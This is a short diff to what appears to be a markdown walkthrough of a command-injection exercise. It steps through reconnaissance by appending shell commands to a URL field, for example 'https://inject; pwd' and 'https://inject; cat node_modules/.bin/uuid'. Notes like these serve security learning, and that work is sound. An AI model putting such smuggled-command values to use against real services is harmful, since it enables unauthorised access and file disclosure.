@@ -40,8 +40,9 @@ e.g. `https://inject; pwd`
       * Permissions to curl (potentially) 
       * Output URL 
  4. Explore file contents  
- `https://inject; cat node_modules/.bin/uuid` . 
- USAGE: `uuid [ver] [options]` + some encryption math used to generate keys  this doesn't seem to be entirely random
+ `https://inject; cat node_modules/.bin/uuid`   
+ USAGE: `uuid [ver] [options]` + some encryption math used to generate keys  
+ this doesn't seem to be entirely random
  5. Read more javascript
   `https://inject; cat node_modules/node-uuid/package.json`
   *lists package version*  
